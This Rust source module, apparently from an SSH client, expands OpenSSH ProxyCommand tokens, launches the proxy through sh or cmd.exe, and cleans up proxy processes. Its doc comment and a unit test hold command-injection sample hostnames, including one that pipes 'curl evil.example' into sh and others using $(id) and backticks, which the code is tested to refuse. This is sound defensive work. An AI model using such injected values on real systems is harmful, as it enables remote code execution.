//! Turning a stored `ProxyCommand` line into a running local process.
//!
//! Two things live here that `proxy_command` used to do inline, and got
//! wrong in the same way on the same platform:
//!
//! 1. **Token expansion.** OpenSSH resolves `%h` / `%n` / `%p` / `%r`
//!    against the host being dialed before it hands the line to a shell
//!    (`ssh_config(5)`: "ProxyCommand and ProxyJump accept the tokens
//!    %%, %h, %n, %p, and %r"). Oryxis did not, so an imported
//!    `~/.ssh/config` entry, whose ProxyCommand almost always carries
//!    those tokens, reached the shell with the literal text `%h` where
//!    the target belonged. Nothing downstream could recover from that:
//!    `aws ssm start-session --target %h` asks SSM for an instance
//!    named `%h`.
//!
//! 2. **The shell.** `sh -c` is the Unix spelling and only that. A
//!    stock Windows box has no `sh` anywhere on `PATH`, so every command
//!    proxy on Windows died in `CreateProcess` before the line was even
//!    parsed. `cmd.exe` is the local equivalent (and what Win32-OpenSSH
//!    reaches for), with the quoting rule below to get a line through it
//!    intact.
//!
//! Expansion happens AFTER the approval gate in `proxy_command`, never
//! before: what the user approved, and what `proxy_command_fingerprint`
//! hashes, is the stored line with its tokens still in it. Substituting
//! first would mint a new fingerprint per target and re-prompt on every
//! host that shares one proxy identity.
//!
//! That ordering is also why the values that go in are checked rather
//! than trusted. The line is approved once; the values it is expanded
//! with arrive per dial, and a sync peer writes hostnames verbatim. A
//! host of `x; curl evil.example | sh` would otherwise turn one
//! approval into a different process every time the peer edited the
//! host. So a substituted value may only be the shape of a host or a
//! login name, and a dial carrying anything else stops here instead of
//! reaching a shell.

use std::collections::VecDeque;
use std::process::Stdio;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::{Child, Command as TokioCommand};
use tokio::task::JoinHandle;

use super::auth::effective_username;
use super::{Connection, ProxyCommandError};

/// What a `ProxyCommand` line can name about one dial.
///
/// The four tokens OpenSSH resolves in a ProxyCommand, taken from the
/// connection being dialed rather than from a second opinion about it:
/// `%r` is the login the auth path will actually send, and `%n` is the
/// name the user knows the host by.
pub(crate) struct ProxyTokens<'a> {
    /// `%h`, the host being dialed.
    pub host: &'a str,
    /// `%p`, the port being dialed.
    pub port: u16,
    /// `%r`, the login this dial authenticates as.
    pub user: &'a str,
    /// `%n`, the name the user knows this host by. For a host imported
    /// from `~/.ssh/config` that IS the `Host` alias (`SshConfigHost`
    /// carries the alias into the connection label), which is exactly
    /// what OpenSSH puts here.
    pub name: &'a str,
}

impl<'a> ProxyTokens<'a> {
    /// The tokens for dialing `conn`.
    ///
    /// `%r` goes through `effective_username`, the same function the
    /// auth path calls, so a line cannot be told about a user the
    /// session never logs in as.
    pub(crate) fn for_dial(conn: &'a Connection) -> Self {
        Self {
            host: &conn.hostname,
            port: conn.port,
            user: effective_username(conn),
            name: &conn.label,
        }
    }
}

/// Everything a substituted value is allowed to contain.
///
/// The set is the union of what a host can be (DNS labels, IPv4, an
/// IPv6 literal, an EC2 instance id) and what a login name can be, and
/// deliberately nothing else. Nothing in it is a word separator, a
/// quote, a glob or an operator in the shell the value lands in, so a
/// value that passes can fill a slot but cannot restructure the line
/// around it.
///
/// Two characters are missing that a first reading would put in, and
/// both were measured rather than assumed:
///
/// - `\` is in the set on Windows and out of it on unix. It is inert to
///   `cmd.exe` and carries the `DOMAIN\user` spelling that only exists
///   there, while `sh` reads it as an escape: `ssh -l DOMAIN\user`
///   arrives as `DOMAINuser`, and a value ending in one splices the
///   next word onto itself (`nc host\ 22` is one argument, `host 22`).
///   Neither is an injection, both are the line quietly meaning
///   something else.
/// - `[` and `]` are in neither. `sh` globs them, so an unquoted
///   `[2001:db8::1]` expands against the working directory the moment a
///   single-character file name matches one. `%h` accepts the bracketed
///   spelling anyway and substitutes the address inside it, which is
///   what OpenSSH's own `%h` would have been.
fn is_substitutable(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 255
        && value.chars().all(|c| {
            c.is_ascii_alphanumeric()
                || matches!(c, '.' | '-' | '_' | ':' | '@' | '/' | '+')
                || (cfg!(windows) && c == '\\')
        })
}

/// Strip the authority-form brackets off an IPv6 literal.
///
/// `oryxis_core::net::host_port` adds them when it builds an address,
/// and a user may well have typed them into the host field, but
/// OpenSSH's `%h` is the bare `HostName`. Only a matched pair is
/// stripped, so a half-bracketed value stays malformed and is refused
/// by `is_substitutable` rather than half-repaired here.
fn unbracket(host: &str) -> &str {
    host.strip_prefix('[')
        .and_then(|inner| inner.strip_suffix(']'))
        .unwrap_or(host)
}

fn checked<'a>(token: &'static str, value: &'a str) -> Result<&'a str, ProxyCommandError> {
    if is_substitutable(value) {
        Ok(value)
    } else {
        Err(ProxyCommandError::UnsafeValue {
            token,
            value: value.to_string(),
        })
    }
}

/// Resolve OpenSSH's ProxyCommand tokens against `tokens`.
///
/// `%%` is a literal `%`. Any other `%x` is left exactly as written:
/// Oryxis implements the four tokens `ssh_config(5)` lists for a
/// ProxyCommand, and a Windows line referring to `%USERPROFILE%` or
/// `%ComSpec%` must reach `cmd.exe` with its environment references
/// intact.
pub(crate) fn expand_proxy_tokens(
    cmd: &str,
    tokens: &ProxyTokens<'_>,
) -> Result<String, ProxyCommandError> {
    if !cmd.contains('%') {
        return Ok(cmd.to_string());
    }
    let port = tokens.port.to_string();
    let mut out = String::with_capacity(cmd.len() + 16);
    let mut chars = cmd.chars();
    while let Some(c) = chars.next() {
        if c != '%' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('%') => out.push('%'),
            Some('h') => out.push_str(checked("%h", unbracket(tokens.host))?),
            Some('p') => out.push_str(&port),
            Some('r') => out.push_str(checked("%r", tokens.user)?),
            Some('n') => out.push_str(checked("%n", tokens.name)?),
            Some(other) => {
                out.push('%');
                out.push(other);
            }
            // A line ending in a bare `%` is not a token; keep it.
            None => out.push('%'),
        }
    }
    Ok(out)
}

/// The local shell, holding an already-expanded line.
///
/// `exec` in front, exactly as OpenSSH does (`expand_proxy_command` in
/// `sshconnect.c`: `xasprintf(&tmp, "exec %s", proxy_command)`): the
/// shell REPLACES itself with the proxy, so the process holding the
/// pipes is the proxy and not a shell waiting on it. A line with more in
/// it than one command reads the way it reads under `ssh`, which is the
/// point: the same `~/.ssh/config` line behaves the same here.
///
/// The process group is the proxy's own (`process_group(0)`), so
/// whatever it forks (a browser helper, a background refresher) can be
/// ended together with it by [`ProxyReaper`].
#[cfg(unix)]
fn shell_command(line: &str) -> TokioCommand {
    let mut cmd = TokioCommand::new("sh");
    cmd.arg("-c").arg(format!("exec {line}"));
    cmd.process_group(0);
    cmd
}

/// The local shell, holding an already-expanded line.
///
/// `cmd.exe` has two rules for the text after `/C`, and picks between
/// them by counting quotes: a line with one quoted argument keeps its
/// quotes, a line with more than one gets its first and last quote
/// stripped. A ProxyCommand routinely has both an interpreter path in
/// `Program Files` and a quoted parameter, which lands it in the second
/// rule and mangles it. `/S` settles the question: it forces the
/// strip-the-outer-pair rule always, so wrapping the whole line in one
/// added pair delivers it verbatim no matter what is inside.
///
/// It has to go through `raw_arg`. Rust quotes a normal `arg` for the
/// MSVC runtime's parser, which `cmd.exe` does not use, and the escaping
/// it adds is what the shell would then choke on.
#[cfg(windows)]
fn shell_command(line: &str) -> TokioCommand {
    use std::os::windows::process::CommandExt;
    use std::path::{Path, PathBuf};

    // Oryxis is a GUI process, so a `cmd.exe` child would otherwise
    // flash a console window on every dial through a command proxy.
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    // `ComSpec`, then the fixed system path, and a bare name only as a
    // last resort: an unqualified `cmd.exe` is resolved by
    // `CreateProcess` against a search path a dropped file can sit in,
    // and this spawn already runs before any handshake. Same shape as
    // the engine's other fixed-path probes (`~/.ssh/pageant.conf` in
    // `engine::agent`, `~/.Xauthority` in `x11::xauth`): an explicit
    // value wins, a fixed path is the fallback.
    let comspec = std::env::var_os("ComSpec")
        .map(PathBuf::from)
        .or_else(|| {
            std::env::var_os("SystemRoot")
                .map(|root| Path::new(&root).join("System32").join("cmd.exe"))
        })
        .unwrap_or_else(|| PathBuf::from("cmd.exe"));

    let mut cmd = TokioCommand::new(comspec);
    cmd.as_std_mut().raw_arg(format!("/S /C \"{line}\""));
    cmd.creation_flags(CREATE_NO_WINDOW);
    cmd
}

/// Spawn an expanded proxy line with its three pipes wired.
///
/// `kill_on_drop`: the `Child` rides inside the transport
/// (`proxy_banner::ProxyTransport`), so the proxy lives exactly as long
/// as the connection that uses it. Closing stdin alone is not enough to
/// end one: a proxy parked on a browser login never reads stdin, and a
/// dial the user cancelled would otherwise leave it running with the
/// login half done. OpenSSH does the same by hand (`SIGHUP` in
/// `ssh_kill_proxy_command`).
pub(crate) fn spawn_proxy_process(line: &str) -> std::io::Result<(Child, ProxyReaper)> {
    let mut cmd = shell_command(line);
    cmd.kill_on_drop(true);
    cmd.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        // Piped, not null. A command proxy fails for ordinary reasons,
        // an expired SSO token, a binary that moved, a region that does
        // not host the target, and it says so on stderr. Discarding that
        // left the user with an unexplained EOF during version exchange
        // and nothing anywhere to explain it.
        .stderr(Stdio::piped());
    let child = cmd.spawn()?;
    let reaper = ProxyReaper::for_child(&child);
    Ok((child, reaper))
}

/// Ends a command proxy AND everything it started when dropped.
///
/// `kill_on_drop` alone ends only the process it holds, which on Windows
/// is `cmd.exe` (the proxy is its child and survives it) and on unix is
/// whatever the line exec'd, not a helper it forked. So the transport
/// also owns one of these:
///
/// - unix: the proxy leads its own process group (`shell_command`), and
///   the group gets `SIGTERM` at once, then `SIGKILL` after
///   [`Self::GRACE`] for anything that ignored it.
/// - Windows: the proxy runs in a Job Object with
///   `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`; closing the handle ends every
///   process in it. The process is assigned right after the spawn, so a
///   grandchild started in the first instant of `cmd.exe`'s life could
///   escape it; `cmd /C` does not start the proxy before it has parsed
///   the line, which is the window this relies on.
pub(crate) struct ProxyReaper {
    #[cfg(unix)]
    pgid: Option<i32>,
    #[cfg(windows)]
    job: Option<JobHandle>,
}

impl ProxyReaper {
    /// How long the group has to exit on `SIGTERM` before `SIGKILL`.
    #[cfg(unix)]
    const GRACE: Duration = Duration::from_millis(300);

    #[cfg(unix)]
    fn for_child(child: &Child) -> Self {
        // The leader's pid IS the group id (`process_group(0)`).
        ProxyReaper {
            pgid: child.id().and_then(|pid| i32::try_from(pid).ok()),
        }
    }

    #[cfg(windows)]
    fn for_child(child: &Child) -> Self {
        ProxyReaper {
            job: child.raw_handle().and_then(JobHandle::containing),
        }
    }

    #[cfg(not(any(unix, windows)))]
    fn for_child(_child: &Child) -> Self {
        ProxyReaper {}
    }
}

impl Drop for ProxyReaper {
    fn drop(&mut self) {
        #[cfg(unix)]
        if let Some(pgid) = self.pgid.take() {
            // SAFETY: plain signal delivery to a process group we
            // created; a group that is already gone answers ESRCH.
            unsafe {
                libc::kill(-pgid, libc::SIGTERM);
            }
            std::thread::spawn(move || {
                std::thread::sleep(Self::GRACE);
                // SAFETY: as above. A group id is not reused while any
                // member of the group lives, and the grace is short.
                unsafe {
                    libc::kill(-pgid, libc::SIGKILL);
                }
            });
        }
        #[cfg(windows)]
        drop(self.job.take());
    }
}

/// A Job Object that kills its processes when the last handle closes.
#[cfg(windows)]
struct JobHandle(windows_sys::Win32::Foundation::HANDLE);

// SAFETY: a job handle is a kernel object reference, usable from any
// thread; it is only closed once, in `Drop`.
#[cfg(windows)]
unsafe impl Send for JobHandle {}
#[cfg(windows)]
unsafe impl Sync for JobHandle {}

#[cfg(windows)]
impl JobHandle {
    /// A new kill-on-close job holding `process`, or `None` when any step
    /// fails (the proxy then ends with `kill_on_drop` alone, as before).
    fn containing(process: std::os::windows::io::RawHandle) -> Option<Self> {
        use windows_sys::Win32::Foundation::CloseHandle;
        use windows_sys::Win32::System::JobObjects::{
            AssignProcessToJobObject, CreateJobObjectW, JobObjectExtendedLimitInformation,
            SetInformationJobObject, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
            JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
        };
        // SAFETY: straight Win32 calls on a handle we own; every failure
        // closes what was opened before returning.
        unsafe {
            let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
            if job.is_null() {
                return None;
            }
            let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
            info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
            let ok = SetInformationJobObject(
                job,
                JobObjectExtendedLimitInformation,
                &info as *const _ as *const core::ffi::c_void,
                std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
            );
            if ok == 0 || AssignProcessToJobObject(job, process as _) == 0 {
                CloseHandle(job);
                return None;
            }
            Some(JobHandle(job))
        }
    }
}

#[cfg(windows)]
impl Drop for JobHandle {
    fn drop(&mut self) {
        // SAFETY: the handle came from CreateJobObjectW and is closed once.
        unsafe {
            windows_sys::Win32::Foundation::CloseHandle(self.0);
        }
    }
}

/// A command proxy's own account of itself.
///
/// Shared between the task draining its stderr, the pre-banner filter on
/// its stdout, and the dial that may have to explain a failure, because
/// the three learn about the proxy on different pipes: russh sees an EOF
/// or a version error on stdout, and the sentence saying why is on the
/// other one (or was printed on stdout BEFORE the banner, which is where
/// `ossh` and friends put their login instructions, issue #223).
///
/// Until the SSH banner arrives it also does two live jobs: every line
/// goes to the UI (`output`, the connect card), and on an ATTENDED dial
/// the first line stops the dial clock under a proxy-auth hold, because
/// a proxy that is talking before the banner is walking someone through
/// a login and the network timeout is not the right bound for that.
#[derive(Clone, Default)]
pub(crate) struct ProxyStderr {
    tail: Arc<Mutex<VecDeque<String>>>,
    drain: Arc<Mutex<Option<JoinHandle<()>>>>,
    live: Arc<Mutex<LivePhase>>,
}

/// What only matters until the SSH banner arrives.
#[derive(Default)]
struct LivePhase {
    /// Where lines go while the dial is still pending (`None` once the
    /// banner arrived, or on an engine with no UI).
    output: Option<tokio::sync::mpsc::UnboundedSender<super::ProxyOutputLine>>,
    /// The dial clock and whether anyone is watching this dial.
    clock: Option<super::dial_clock::DialClock>,
    attended: bool,
    /// Taken on the first line of an attended dial, dropped at the banner.
    hold: Option<super::dial_clock::Hold>,
    banner_seen: bool,
}

impl ProxyStderr {
    /// How many lines travel in the dial error. Enough for a stack of
    /// "token expired" plus the "run `aws sso login`" under it, short
    /// enough that the connect card stays a card.
    const TAIL: usize = 5;

    /// How long a failing dial waits for the complaint to arrive. The
    /// proxy that just died has closed its stderr, so the drain ends on
    /// its own and this resolves at once; the cap is for the proxy that
    /// is still alive and simply had nothing more to say.
    const SETTLE: Duration = Duration::from_millis(250);

    /// A sink wired to the dial: `output` receives the proxy's lines until
    /// the banner, and `clock` is stopped while an attended proxy talks.
    pub(crate) fn for_dial(
        output: Option<tokio::sync::mpsc::UnboundedSender<super::ProxyOutputLine>>,
        clock: Option<super::dial_clock::DialClock>,
        attended: bool,
    ) -> Self {
        let sink = ProxyStderr::default();
        {
            let mut live = sink.live.lock().unwrap_or_else(|e| e.into_inner());
            live.output = output;
            live.clock = clock;
            live.attended = attended;
        }
        sink
    }

    fn push(&self, line: String) {
        let mut tail = self.tail.lock().unwrap_or_else(|e| e.into_inner());
        if tail.len() == Self::TAIL {
            tail.pop_front();
        }
        tail.push_back(line);
    }

    /// One line the proxy said, on `source`'s pipe. The ONE place a
    /// proxy line enters: it is sanitized here (`sanitize_proxy_line`),
    /// so the card, the pane, the dial error and the log all see the
    /// same visible text and none of them sees an escape sequence.
    /// Returns that text for the caller to log, or `None` when nothing
    /// visible is left.
    pub(crate) fn heard(
        &self,
        line: &str,
        source: super::ProxyOutputSource,
    ) -> Option<String> {
        let line = super::sanitize_proxy_line(line);
        if line.trim().is_empty() {
            return None;
        }
        let mut live = self.live.lock().unwrap_or_else(|e| e.into_inner());
        if !live.banner_seen {
            if let Some(tx) = &live.output {
                let _ = tx.send(super::ProxyOutputLine {
                    text: line.clone(),
                    source,
                });
            }
            if live.attended
                && live.hold.is_none()
                && let Some(clock) = &live.clock
            {
                live.hold = Some(clock.hold(super::dial_clock::HoldKind::ProxyAuth));
            }
        }
        drop(live);
        self.push(line.clone());
        Some(line)
    }

    /// The SSH banner arrived: the login (if any) is over. Resumes the
    /// dial clock and stops feeding the UI.
    pub(crate) fn banner_arrived(&self) {
        let mut live = self.live.lock().unwrap_or_else(|e| e.into_inner());
        live.banner_seen = true;
        live.hold = None;
        live.output = None;
    }

    fn lines(&self) -> Vec<String> {
        self.tail
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .iter()
            .cloned()
            .collect()
    }

    /// The proxy's last words, after giving the drain a moment to catch
    /// up.
    ///
    /// Dropping the join handle on timeout DETACHES the drain rather
    /// than aborting it, which is what it has to do: a proxy still
    /// running needs its stderr kept open (see `drain_proxy_stderr`).
    pub(crate) async fn settled_tail(&self) -> Vec<String> {
        let handle = self.drain.lock().unwrap_or_else(|e| e.into_inner()).take();
        if let Some(handle) = handle {
            let _ = tokio::time::timeout(Self::SETTLE, handle).await;
        }
        self.lines()
    }
}

/// How many lines of a command proxy's output reach the log, per pipe.
/// Every line still reaches the dial error and the UI; the log is the
/// offline account, and a proxy can print a device code or a token.
pub(crate) const LOGGED_LINES: usize = 32;

/// Start draining a command proxy's stderr, and hand back the sink the
/// dial reads its last words from.
pub(crate) fn watch_proxy_stderr(
    stderr: tokio::process::ChildStderr,
    host: String,
    port: u16,
    sink: ProxyStderr,
) -> ProxyStderr {
    let handle = tokio::spawn(drain_proxy_stderr(stderr, host, port, sink.clone()));
    *sink.drain.lock().unwrap_or_else(|e| e.into_inner()) = Some(handle);
    sink
}

/// Copy a command proxy's own diagnostics somewhere they can be read.
///
/// Two jobs, and the second is why this loop never stops early. The
/// first `LOGGED_LINES` go to the log, which is the offline account of
/// why a dial failed; EVERY line updates `sink`, so the dial error
/// carries the proxy's last words rather than its first.
///
/// The reader stays open for as long as the proxy runs. Dropping it
/// once a budget ran out would close the pipe under a still-running
/// proxy, and on unix the next thing it wrote would die of SIGPIPE: a
/// chatty proxy (a progress meter, a retry loop) would take a live
/// session down with it once it passed the cap.
///
/// One thing worth knowing about the log half: this is the proxy's own
/// output, not its command line, and a CLI that fails by printing its
/// usage prints its arguments with it. The line itself is still kept
/// out of the log on purpose (it can embed credentials), but a proxy
/// determined to echo its own can defeat that, which is the price of
/// having any account at all of why a dial failed.
async fn drain_proxy_stderr(
    stderr: tokio::process::ChildStderr,
    host: String,
    port: u16,
    sink: ProxyStderr,
) {
    let mut lines = BufReader::new(stderr).lines();
    let mut logged = 0usize;
    while let Ok(Some(line)) = lines.next_line().await {
        let Some(line) = sink.heard(&line, super::ProxyOutputSource::Stderr) else {
            continue;
        };
        if logged >= LOGGED_LINES {
            continue;
        }
        logged += 1;
        tracing::warn!(
            target: "oryxis::ssh::proxy",
            %host,
            port,
            "command proxy: {}",
            line
        );
        if logged == LOGGED_LINES {
            tracing::warn!(
                target: "oryxis::ssh::proxy",
                %host,
                port,
                "command proxy: further output is kept for the dial error but no longer logged"
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tokens<'a>(host: &'a str, port: u16, user: &'a str, name: &'a str) -> ProxyTokens<'a> {
        ProxyTokens {
            host,
            port,
            user,
            name,
        }
    }

    fn host_only(host: &str, port: u16) -> ProxyTokens<'_> {
        tokens(host, port, "root", "the-host")
    }

    #[test]
    fn the_ssm_line_from_ssh_config_expands() {
        // Verbatim shape of the AWS-documented ProxyCommand, which is
        // the case that sent this module into existence.
        let line = "aws ssm start-session --target %h \
                    --document-name AWS-StartSSHSession --parameters portNumber=%p";
        let out = expand_proxy_tokens(line, &host_only("i-00cfa8b4282a0b658", 22)).unwrap();
        assert_eq!(
            out,
            "aws ssm start-session --target i-00cfa8b4282a0b658 \
             --document-name AWS-StartSSHSession --parameters portNumber=22"
        );
    }

    #[test]
    fn every_token_ssh_config_lists_resolves() {
        // The four from `ssh_config(5)`: "ProxyCommand and ProxyJump
        // accept the tokens %%, %h, %n, %p, and %r."
        let out = expand_proxy_tokens(
            "helper --alias %n --user %r --to %h:%p",
            &tokens("db.internal", 2222, "deploy", "db"),
        )
        .unwrap();
        assert_eq!(out, "helper --alias db --user deploy --to db.internal:2222");
    }

    #[test]
    fn a_doubled_percent_is_one_literal_percent() {
        let out =
            expand_proxy_tokens("run --pct 50%% --to %h", &host_only("h.example", 22)).unwrap();
        assert_eq!(out, "run --pct 50% --to h.example");
    }

    #[test]
    fn an_unknown_token_survives_untouched() {
        // A Windows line has environment references in it and they are
        // the shell's business, not ours.
        let out =
            expand_proxy_tokens("%ComSpec% /c helper %h", &host_only("h.example", 22)).unwrap();
        assert_eq!(out, "%ComSpec% /c helper h.example");
    }

    #[test]
    fn a_line_without_tokens_is_returned_as_written() {
        let line = "cloudflared access ssh --hostname fixed.example";
        assert_eq!(expand_proxy_tokens(line, &host_only("h", 22)).unwrap(), line);
    }

    #[test]
    fn an_ipv6_literal_loses_its_brackets_and_keeps_its_address() {
        // Both spellings reach `%h`, and neither may reach `sh` with a
        // glob in it.
        for spelling in ["[2001:db8::1]", "2001:db8::1"] {
            let out = expand_proxy_tokens("nc %h %p", &host_only(spelling, 22)).unwrap();
            assert_eq!(out, "nc 2001:db8::1 22", "for {spelling:?}");
        }
    }

    #[test]
    fn a_half_bracketed_host_is_refused_rather_than_repaired() {
        let err = expand_proxy_tokens("nc %h %p", &host_only("[2001:db8::1", 22)).unwrap_err();
        assert!(matches!(
            err,
            ProxyCommandError::UnsafeValue { token: "%h", .. }
        ));
    }

    #[test]
    fn a_hostname_that_could_run_a_command_is_refused() {
        // The approval covers the line, not the host it is expanded
        // with, so this is the one that has to fail closed.
        for hostile in [
            "h.example; curl evil.example | sh",
            "h.example`id`",
            "h.example$(id)",
            "h.example&calc",
            "h example",
            "h.example\"",
            "h.example'",
            "h.example|nc",
            "h.example\nsecond",
        ] {
            let err = expand_proxy_tokens("nc %h %p", &host_only(hostile, 22)).unwrap_err();
            assert!(
                matches!(err, ProxyCommandError::UnsafeValue { token: "%h", .. }),
                "expected a refusal for {hostile:?}, got {err:?}"
            );
        }
    }

    #[test]
    fn a_username_that_could_run_a_command_is_refused() {
        let err = expand_proxy_tokens(
            "ssh -l %r bastion",
            &tokens("h.example", 22, "a;id", "the-host"),
        )
        .unwrap_err();
        assert!(matches!(
            err,
            ProxyCommandError::UnsafeValue { token: "%r", .. }
        ));
    }

    #[test]
    fn a_connection_label_that_is_not_a_name_is_refused() {
        // `%n` is the connection's own label, which is free text a user
        // types ("My Server"). It fills a slot or it stops the dial; it
        // never reaches a shell with a space in it.
        let err = expand_proxy_tokens(
            "helper --alias %n",
            &tokens("h.example", 22, "root", "My Server"),
        )
        .unwrap_err();
        assert!(matches!(
            err,
            ProxyCommandError::UnsafeValue { token: "%n", .. }
        ));
    }

    /// The escape half of the allowlist, which is platform-split
    /// because `\` means two different things.
    #[test]
    fn a_backslash_login_is_a_windows_spelling_only() {
        let out = expand_proxy_tokens(
            "ssh -l %r bastion",
            &tokens("h.example", 22, "CORP\\deploy", "the-host"),
        );
        if cfg!(windows) {
            // Inert to `cmd.exe`, and the only shell that spelling
            // belongs to.
            assert_eq!(out.unwrap(), "ssh -l CORP\\deploy bastion");
        } else {
            // `sh` would eat the backslash and hand the proxy
            // `CORPdeploy`, a different user, silently.
            assert!(matches!(
                out.unwrap_err(),
                ProxyCommandError::UnsafeValue { token: "%r", .. }
            ));
        }
    }

    #[tokio::test]
    async fn the_local_shell_runs_a_line_and_hands_back_its_output() {
        // The platform half: whatever `shell_command` picked has to
        // actually exist and actually run the line. This is the
        // assertion that was missing on Windows, where `sh` never did.
        use tokio::io::AsyncReadExt;

        let (mut child, _reaper) = spawn_proxy_process("echo oryxis-proxy-ok").expect("proxy spawn");
        let mut out = String::new();
        child
            .stdout
            .take()
            .expect("stdout")
            .read_to_string(&mut out)
            .await
            .expect("read");
        assert!(
            out.contains("oryxis-proxy-ok"),
            "shell did not run the line, got {out:?}"
        );
    }

    #[tokio::test]
    async fn a_quoted_interpreter_path_with_spaces_survives_the_shell() {
        // The Windows quoting rule this module exists to get right: a
        // line with more than one quoted run used to come out of
        // `cmd.exe` with its first and last quote gone.
        #[cfg(windows)]
        let line = r#""C:\Windows\System32\cmd.exe" /c echo "a b" c"#;
        #[cfg(unix)]
        let line = r#"/bin/echo "a b" c"#;

        use tokio::io::AsyncReadExt;
        let (mut child, _reaper) = spawn_proxy_process(line).expect("proxy spawn");
        let mut out = String::new();
        child
            .stdout
            .take()
            .expect("stdout")
            .read_to_string(&mut out)
            .await
            .expect("read");
        assert!(out.contains("a b"), "quoting was mangled, got {out:?}");
    }

    /// A proxy that talks past the log budget must survive it, and the
    /// dial must get its LAST words rather than its first.
    ///
    /// Unix-only for a reason this time, and not the one the old
    /// `#[cfg(unix)]` in `engine::tests` had: the regression is SIGPIPE,
    /// which is a unix signal. A Windows proxy writing to a closed pipe
    /// gets an error back and decides for itself what to do with it.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_proxy_that_outtalks_the_log_budget_is_not_killed_by_it() {
        let (mut child, _reaper) = spawn_proxy_process(
            "sh -c 'i=0; while [ $i -lt 200 ]; do echo chatter $i >&2; i=$((i+1)); done; \
             echo the-last-word >&2; echo done'",
        )
        .expect("proxy spawn");

        let stderr = child.stderr.take().expect("stderr");
        let sink = watch_proxy_stderr(
            stderr,
            "host.example".to_string(),
            22,
            ProxyStderr::default(),
        );

        let status = child.wait().await.expect("wait");
        assert!(status.success(), "the proxy died talking, status {status:?}");

        let tail = sink.settled_tail().await;
        assert_eq!(
            tail.last().map(String::as_str),
            Some("the-last-word"),
            "the dial gets the proxy's last words, got {tail:?}"
        );
        assert!(
            tail.len() <= ProxyStderr::TAIL,
            "tail is capped, got {tail:?}"
        );
    }
}
